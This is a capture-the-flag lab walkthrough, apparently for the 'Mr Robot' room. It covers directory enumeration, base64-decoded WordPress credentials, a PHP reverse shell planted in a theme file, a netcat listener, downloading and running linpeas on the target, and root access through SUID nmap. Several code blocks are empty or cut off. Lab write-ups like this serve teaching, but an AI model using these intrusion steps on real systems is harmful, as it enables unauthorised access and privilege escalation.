I personally felt like it was not just a simple room but a kinda crash course of using tools used for WebEx. 

Most Important learning from this machine: **Most systems don’t break from Brute-force, they break from overlooked configs**

## **Walkthrough**

Nmap Scan:

```

Looking at the result of nmap scan, port 22 ssh is closed. Port 80 http is up and running Apache http. Also port 443 is up.

Now visiting the ip in browser:

I recommend trying all the comands given, even if it’s not useful. try diging may be can find some easier method.

Then I tried gobuster:

```jsx
gobuster dir --url http://10.10.209.231/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

```

As per the result and hint provided, I am interested more in the robots page. And yes, I contained the first key(flag)

![image](https://github.com/user-attachments/assets/2579726a-d030-4dba-abf4-22a311faf07d)


we have `fsocity.dic` and `key-1-of-3.txt` listed under `/robots`.  And going into `/key-1-of-3.txt` reveals the 1st key of the challange.

`fsocity.dic`  contains the list of usernames and password that we can use to bruteforce the admin login of the wordpress site

`/wp-login.php` reveals us login panel of wordpress.

![image](https://github.com/user-attachments/assets/f4881853-92b6-44e1-bc80-7a45a59376ae)


We have a set of usernames and password, shall we try BruteForceing it ???

We have got an  `/license` page also. Let’s try

![image](https://github.com/user-attachments/assets/5362c0a6-c9cd-421e-aca8-b8a38b8c0089)


We got an base64 encoded string right here. Let’s decrypt

![image](https://github.com/user-attachments/assets/df678355-b6f7-499d-87c7-f8f80ed43a6c)


Here we got the login username and password 
Let’s login

we have access to wordpress dashboard.

What to do next?

![image](https://github.com/user-attachments/assets/1406f20c-ec23-43e1-8d0f-8bb7b871713c)


Our best step would be to inject or replace the php file to malicious one. So that when the website runs the php we get ourself reverse shell.

For this i will be using php reverse shell from pentestmonkey https://github.com/pentestmonkey/php-reverse-shell

![image](https://github.com/user-attachments/assets/4a16b852-b482-4a6a-9107-2514bfec5935)


Replace with malicious code and change the IP Address and port. Next, run `netcat` and visit the 404 page. 

```bash
nc -lvnp 1234
```

```bash

```

looking at the home directory of robot user. We can see to files.

`key-2-of-3.txt` and `password.raw-md5`

we don’t have access to `key-2-of-3.txt` but we can read `password.raw-md5`reading the password file reveals what looks like username and md5 encrypted password.

the decode password. Now lets login with the user robot

```bash
daemon@linux:/home/robot$ su robot

robot@linux:~$ whoami

Now for 3rd flag, it was necessary to perform privilege escalation to gain root access and open the root flag. On my Kali Linux, I downloaded `linpeas`, launched a web server, and downloaded `linpeas.sh` to the server.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

python3 -m http.server

wget 10.10.33.211:8000/linpeas.sh

./linpeas.sh

SUID - Check easy privesc, exploits and write perms
...
-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
...
```

With `linpeas`, I discovered that `nmap` could be exploited. Following a guide on GTFOBins, I found out how to exploit `nmap` for sudo privileges, became root, and obtained the root flag.

GFOBin -> https://gtfobins.github.io/gtfobins/nmap/#sudo

```bash
robot@linux:/tmp$ nmap --interactive
